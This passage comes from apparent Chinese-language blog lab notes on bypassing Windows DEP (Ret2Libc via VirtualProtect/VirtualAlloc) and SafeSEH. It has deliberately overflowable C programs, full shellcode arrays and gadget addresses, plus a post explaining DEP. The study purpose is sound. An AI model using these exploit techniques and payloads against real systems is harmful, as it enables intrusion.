\"\\xA4\\xDE\\xA2\\x7C\" // jmp esp \"\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; void test() { char str[176]; //__asm int 3 memcpy(str, shellcode, 420); } int main() { HINSTANCE hInst = LoadLibrary(\"shell32.dll\"); char temp[200]; test(); return 0; } 2.3 实验内容实验解释 本实验不启用GS和DEP test有典型的溢出 覆盖返回地址后，通过Ret2Libc技术，利用VirtualProtect函数将shellcode所在的内存区域设置为可执行模式 通过push esp jmp eax指令序列动态设置VirtualProtect函数中的shellcode所在内存起始地址以及内存原始属性类型保存地址 内存取悦被设置为可执行模式后shellcode就可正常执行了 实验环境 推荐使用环境 备注 操作系统 Windows 2003 SP2 DEP状态 Optout 编译器 VC 6.0 编译选项 禁用优化选项 build版本 debug版本 VirtualProtect函数的具体实现如图，我们可以选择0x7C801FE8作为切入点，按照函数要求布置好栈帧。 由于溢出过程导致EBP被破坏，所以可用PUSH ESP POP EBP ERTN 4来修复。 溢出字符串的起始地址：0x0012FDB0返回地址所在位置: 0x0012FE64修正EBP地址(push esp pop ebp retn 4)：0x7CBBD9BA由于执行完这些指令后，esp就转到了ebp+8。此时状态如下: 于是可以尝试让ESP向下移动4字节，RETN指令即可，此处用的是0x7C84178B处，最后ESP=0x0012FE74。然后用PUSH ESP RETN/JMP **指令，就可以让esp继续向下移动4字节，并且保证进入shellcode中，0x77C97DBF处的&quot;push esp jmp eax&quot;符合要求。但是shellcode现在还没有执行能力，所以需要修改一下shellcode，在修正EBP之前先pop eax retn。此时的eax对应的是pop pop pop retn。后续都是调试出来的，现如今还无法讲清楚！！！！ 然后继续调试，最终得到上面代码中的shellcode。 3. Ret2Libc之利用VirtualAlloc3.1 VirtualAlloc简介位于kernel32.dll中的VirtualAlloc函数可以申请一段具有可执行属性的内存。于是可以用Ret2Libc的第一跳设置为VirtualAlloc函数地址，然后将shellcode复制到申请的内存空间执行 VirutlAlloc函数说明 LPVOID WINAPI VirtualAlloc{ __in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect }; lpAddress: 申请内存区域的地址，如果参数是NULL，系统将会决定分配内存取悦位置，并且按照64KB向上取整dwSize：申请内存的类型flAlloctionType: 申请内存的类型flProtect：申请内存的访问控制类型，如读写执行等 3.2 实验代码 #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\xBA\\xD9\\xBB\\x7C\" // 修正EBP \"\\xBC\\x45\\x82\\x7C\" // 申请空间 \"\\x90\\x90\\x90\\x90\" \"\\xFF\\xFF\\xFF\\xFF\" // -1 当前进程 \"\\x00\\x00\\x03\\x00\" // 申请空间起始地址 \"\\xFF\\x00\\x00\\x00\" // 申请空间大小 \"\\x00\\x10\\x00\\x00\" // 申请类型 \"\\x40\\x00\\x00\\x00\" // 申请空间访问类型 \"\\x90\\x90\\x90\\x90\" \"\\x8A\\x17\\x84\\x7C\" // pop eax retn \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x0B\\x1A\\xBF\\x7C\" // pop pop retn \"\\xBA\\xD9\\xBB\\x7C\" // 修正EBP retn 4 \"\\x5F\\x78\\xA6\\x7C\" // pop retn \"\\x00\\x00\\x03\\x00\" // 可执行内存空间地址，转入执行用 \"\\x00\\x00\\x03\\x00\" // 可执行内存空间地址，复制用 \"\\xBF\\x7D\\xC9\\x77\" // push esp jmp eax && 原始shellcode起始地址 \"\\xFF\\x00\\x00\\x00\" // shellcode 长度 \"\\xAC\\xAF\\x94\\x7C\" // memcpy \"\\x00\\x00\\x03\\x00\" // 一个可以读地址 \"\\x00\\x00\\x03\\x00\" // 一个可以读地址 \"\\x00\\x90\\x90\\x94\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; void test() { char str[176]; //__asm int 3 memcpy(str, shellcode, 500); } int main() { HINSTANCE hInst = LoadLibrary(\"shell32.dll\"); char temp[200]; test(); return 0; } 3.3 实验内容实验思路 不启用GS和SafeSEH test存在典型的溢出 通过覆盖范返回地址，运用Ret2Libc技术，利用VirtualAlloc函数申请一段具有可执行权限的内存 通过memcpy函数将shellcode复制到VirtualAlloc函数申请的可执行内存空间中 最后在这段可执行的内存空间中执行shellcode，实现DEP绕过 实验环境 推荐使用环境 备注 操作系统 Windows 2003 SP2 DEP状态 Optout 编译器 VC 6.0 编译选项 禁用优化选项 build版本 debug版本 VirtualAlloc函数的具体实现 类似VirtualProtect，我们选择0x7C8245BC（CALL VirtualAllocEx）处作为切入点。 lpAddress=0x00030000 dwSize=0xFF flAllocationType=0x00001000 flProtect=0x00000040 当执行到call VirtualAllocEx地址后，发现如图所示的内容：从图中可以看出eax=0x00030000，这说明我们申请到了空间。 而memcpy函数位于ntdll.dll，需要三个参数，分别为目的内存起始地址、源内存起始地址、复制长度。其中目的内存地址和复制长度可以直接写在shellcode中，但是源内存起始地址不好确定，所以使用push esp jmp eax指令来填充这个参数。 根据图片可以看出， memcpy中的源地址放在了EBP+0xC，目的地址为EBP+0x10，长度为EBP+0x8。所以后面的工作就是将这三个位置进行赋值，采用Ret2Libc的方式，对这些位置进行赋值。","tags":[{"name":"DEP","slug":"DEP","permalink":"http://yoursite.com/tags/DEP/"},{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"DEP机制的保护原理","date":"2017-07-09T09:35:51.000Z","path":"2017/07/09/DEP机制的保护原理/","text":"1. DEP简介溢出攻击的根源是现代计算机对数据和代码没有明确区分。而重新设计计算机体系结构基本上不可能，所以只能向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护， Data Execution Prevention）设计弥补这一缺陷。 DEP基本原理是将数据所在的页面标识设置为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据基本页面上执行指令，此时CPU会抛出异常，而不是执行恶意指令。 DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。从Windows XP SP2开始有，分为：软件DEP(Software DEP)和硬件DEP(Hardware-enforeced DEP) 软件DEP就是SafeSEH。 硬件DEP：需要CPU支持，AMD称为No-Execute Page-Protection(NX)、Intel称为Execute Disable Bit(XD)。操作系统通过设置内存页的NX/XD属性标记，来指明是否可以从该内存中执行代码。所以页面表(Page Table)中需要加入特殊标识位(NX/XD)，若其为0表示页面允许执行，为1表示不允许执行。 2. 判断机器上是否允许DEP我的电脑-&gt;属性-&gt;系统属性-&gt;高级-&gt;性能-&gt;设置-&gt;性能选项-&gt;数据执行保护。 若CPU不支持硬件DEP，该页面底部会有提示&quot;您的计算机的处理器不支持基于硬件的DEP，但是，Windows可以使用DEP软件帮助保护免受某些类型的攻击&quot; 3. DEP的四种工作状态 Optin：默认仅将DEP保护用于Windows系统组件和服务，对于其他程序不予保护，但用户可以通过应用程序兼容性工具（ACT，Application Compatibility Toolkit）为选定的程序启用DEP，在Vista下边经过/NXcompat选项编译过的程序将自动应用DEP。这种状态可以被应用程序动态关闭，它多用于普通用户版操作系统：Windows XP、Windows Vista、Windows 7 Optout：为排除列表程序外的所有程序和服务启用DEP，用户可以手动在排除列表中指定不启用DEP保护的程序和服务。这种状态可以被动态关闭，多用于服务器版操作系统：windows 2003、windows 2008 AlwaysOn：对所有进程启用DEP的保护，不存在排序列表，这种模式下，DEP不可以被关闭，目前只有64位操作系统上才工作在AlwaysOn模式 AlwaysOff：对所有进程都禁用DEP，在这种模式下，DEP也不能被动态开启，这种模式一般只有在某种特定场合才使用，如DEP干扰到程序的正常运行 4. 设置DEP机器上设置DEP在C:\\boot.ini中设置： 设置DEP关闭: /execute=optin /fastdetect 设置DEP工作模式： /noexecute=optout /fastdetect 编译器中设置链接选项 Visual Studio 2005及其后续版本引入了链接选项/NXCOMPAT，默认为开启 Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT 采用/NXCOMPAT编译的程序会在PE头中设置IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识，该标识通过结构体IMAGE_OPTIONAL_HEADER中DllCharacteristics变量进行体现，当DllCharacteristics设置为0x100表示程序采用/NXCOMPAT编译。 5. DEP的局限性 硬件DEP需要CPU支持 由于兼容性原因Windows不能对所有进程开启DEP保护，否则会出现异常。例如第三方的插件DLL，由于无法确认其是否开启DEP，对这些DLL程序不能贸然开启DEP保护；使用ATL 7.1或者以前版本的程序需要在数据页面上产生可执行代码，这时就不能启用DEP保护，否则会出现异常 /NXCOMPAT编译选项，或者IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识的设置，只对Windows Vista以上的系统有效。也就是说，即使采用了这种链接选项，在某些操作系统上也不会自动启用DEP保护。 DEP工作在Optin和Optout下时，DEP可以被动态关闭或开启。操作系统中某些API函数可控制DEP状态，而它们在早期的操作系统中对这些API函数的调用没设置线坠。","tags":[{"name":"DEP","slug":"DEP","permalink":"http://yoursite.com/tags/DEP/"},{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"test1","date":"2017-07-08T17:32:57.000Z","path":"2017/07/09/test/test1/","text":"test","tags":[{"name":"test1","slug":"test1","permalink":"http://yoursite.com/tags/test1/"}]},{"title":"绕过SafeSEH的方法","date":"2017-07-08T02:01:51.000Z","path":"2017/07/08/绕过SafeSEH的方法/","text":"1. 攻击返回地址绕过SafeSEH在《栈溢出原理与实践》中有介绍 2. 利用虚函数绕过SafeSEH在《绕过GS安全编译的方法》中有范例 3. 从堆中绕过SafeSEH3.1 实验代码 #include \"stdafx.h\" #include \"stdlib.h\" #include \"string.h\" char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xB8\\x28\\x39\\x00\"; void test(char *input) { char str[200]; strcpy(str, input); int zero = 0; zero = 1/zero; } void main() { char * buf = (char *)malloc(500); //__asm int 3 strcpy(buf, shellcode); test(shellcode); } 3.2 实验内容实验思路： 首先从堆中申请500字节的空间，用来存放shellcode 函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息 用shellcode在堆中的起始位置覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，进而跳转到堆中的shellcode执行 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 DEP关闭 编译器 Visual Studio 2008 编译选项 禁用优化选项 build版本 release版本 得到的数据申请的堆空间起始地址:0x003928B8复制给str后的栈起始地址：0x0012FE9C离栈顶最近的SEH处理函数句柄：0x0012FFB0+4 于是得到shellcode： 168字节的谈对对话框机器码 112 * &quot;\\x90&quot; 堆起始地址: 0x003928B8 4. 利用未启用SafeSEH模块绕过SafeSEH如果模块未启用SafeSEH，并且模块不是仅包含中间语言IL，这个异常处理就可以被执行。所以若能找到一个不启用SafeSEH的dll，然后加载之后通过它里面的指令作为跳板实现SafeSEH的绕过。 4.1 实验代码 #include \"stdafx.h\" #include \"string.h\" #include \"windows.h\" char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x68\" \"\\xf1\\x21\\x12\\x11\" \"\\x90\\x90\\x90\\x68\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; DWORD MyException(void) { printf(\"There is an exception\"); getchar(); return 1; } void test(char *input) { char str[200]; strcpy(str, input); int zero = 0; __try{ zero = 1/zero; } __except(MyException()){} } int _tmain(int argc, _TCHAR *argv[]) { // Load NO_SafeSEH Module HINSTANCE hInst = LoadLibrary(_T(\"SEH_NOSafeSEH_JUMP.dll\")); char str[200]; //__asm int 3 test(shellcode); return 0; } 4.2 实验内容实验思路： 用VC++ 6.0编译一个不是用SafeSEH的动态链接库SEH_NOSafeSEH_JUMP.DLL，然后由启用SafeSEH的应用程序SEH_NOSafeSEH.EXE去加载 SEH_NOSafeSEH中的test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息 使用SEH_NOSafeSEH_JUMP.DLL中的&quot;pop pop retn&quot;指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行。 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 DEP关闭 EXE编译器 Visual Studio 2008 DLL编译器 VC++ 6.0 将dll基址设为0x11120000 编译选项 禁用优化选项 build版本 release版本 编译DLL 在VC++ 6.0新建“Win32 Dynamic-Link Library”工程，创建一个简单的DLL工程 按照实验代码编写对应的cpp文件 由于VC++ 6.0默认编译的DLL文件加载地址为0x10000000，如果其作为DLL加载地址可能会包含0x00，这会导致strcpy字符串截断，所以为方便测试，需要重新设置基址。&quot;工程-&gt;设置-&gt;连接选显卡&quot;，在&quot;工程选项&quot;输入框中添加&quot;/base:&quot;0x11120000&quot;&quot; OllySSEH插件说明对于SafeSEH描述分为以下四种，如图所示 /SafeSEH OFF: 未启用SafeSEH，这种模式可作为跳板 /SafeSEH ON：启用SafeSEH，可以使用右键点击查看SEH注册情况 NO SEH：不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，所以不能作为跳板 Erro：读取错误 后续操作 在SEH_NOSafeSEH_JUMP.DLL中找到&quot;pop pop retn&quot;序列。非常蛋疼的是明明在dll文件中写入一个函数&quot;pop eax, pop eax, retn&quot;，但是在编译的时候就找不到了。不过dll文件中存在&quot;pop ecx, pop ecx, retn&quot;这样原始序列，我们也可以拿来使用，位置为0x111221F1 溢出字符串起始位置0x0012FDB8最近的异常处理函数句柄0x0012FE90+4 VS 2008编译的程序，在进入含有\\_\\try{}的函数时会在Security Cookie+4的位置压入-2（VC++ 6.0下为-1），在程序进入\\\\try{}区域时程序会根据该\\\\try{}块在函数中的位置而修改成不同的值（第一层try会将这个值修改为0， 第二层会将这个值修改1）。如果\\\\try{}块中出现异常，程序会根据这个值调用相应的\\\\except()处理，处理结束后这个位置的值会重新修改为-2；如果每发生异常，程序会在离开\\\\_try{}块时这个值也会被修改回-2。 由于上面的操作，如果将shellcode放在前面的话可能会对弹出对话框的造成破坏，所以将弹出对话框的机器码放在了最后 shellcode组成 220 * &quot;\\x90&quot; &quot;pop pop retn&quot;地址0x111221F1 16 * &quot;\\x90&quot; 168字节的弹出对话框机器码 4.3 验证及其思考由于用上面的shellcode无法正常出现弹框，所以我花了半天时间来解决这中间的问题！ Ollydbg如何调试SEH？ 首先程序运行到出错的汇编代码处，然后两次&quot;Shift+F7&quot;进入错误判断程序 然后通过SEH Chain窗口，获取离栈顶最近的SEH，双击跳转至该地址，&quot;F2&quot;设置断点 最后直接&quot;F9&quot;跳转至该位置 &quot;pop pop retn&quot;作为异常处理函数所做的工作 首先，弹出异常判断回去的指针 然后弹出原始栈顶中的一位参数 最后返回离栈顶最近的SEH的链表指针所在地址(而不是函数处理句柄)【有时候由于没有中间的参数，而导致返回的是函数处理句柄】 从上面的图片可以看出，2112被解析成&quot;AND DWORD PTR DS:[EDX],EDX&quot;，而EDX是不能被修改的，所以出错，后面的指令也陆续发生错误！ 解决办法：修改SEH链表指针&quot;\\x90\\x90\\x90\\x90&quot;。 本人尝试了很多办法，最后使用的将0x111221F1作为push的参数压入栈中 紧接着的数据本来是&quot;\\x90\\x90\\x90\\x90&quot;，但是可能中间的某些操作导致该数据被修改为0000，可以使用同样的办法，将其压入栈中 最终的shellcode组成 219 * &quot;\\x90&quot; + &quot;\\x68&quot; &quot;pop pop retn&quot;地址0x111221F1 3 * &quot;\\x90&quot; + &quot;\\x68&quot; + 12 * &quot;\\x90&quot; 168字节的弹出对话框机器码 5. 利用加载模块之外的地址绕过SafeSEHOllyDbg调试时，用&quot;view-&gt;memory&quot;可以查看程序的映射状态。类型为&quot;Map&quot;的映射文件，SafeSEH是无视的。当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的。如果可以在这些文件中找到跳板指令，就可以绕过SafeSEH。 其实除了\"pop pop retn\"指令序列外，一下指令也可以使用： call/jmp dword ptr [esp+0x8] call/jmp dword ptr [esp+0x14] call/jmp dword ptr [esp+0x1c] call/jmp dword ptr [esp+0x2c] call/jmp dword ptr [esp+0x44] call/jmp dword ptr [esp+0x50] call/jmp dword ptr [ebp+0xc] call/jmp dword ptr [ebp+0x24] call/jmp dword ptr [ebp+0x30] call/jmp dword ptr [ebp-0x4] call/jmp dword ptr [ebp-0xc] call/jmp dword ptr [ebp-0x18] 5.1 实验代码 #include \"stdafx.h\" #include \"string.h\" #include \"windows.h\" char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90\" \"\\xEB\\xF6\\x90\\x90\" \"\\x0B\\x0B\\x28\\x00\"; DWORD MyException(void) { printf(\"There is an exception\"); getchar(); return 1; } void test(char * input) { char str[200]; strcpy(str, input); int zero=0; __try { zero = 1/zero; } __except(MyException()){} } int _tmain(int argc, _TCHAR* argv[]) { //__asm int 3 test(shellcode); return 0; } 5.2 实验内容实验思路： Test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH 该程序中所有加载模块都启用了SafeSEH机制，故不能通过未启用SafeSEH的模块来绕过SafeSEH 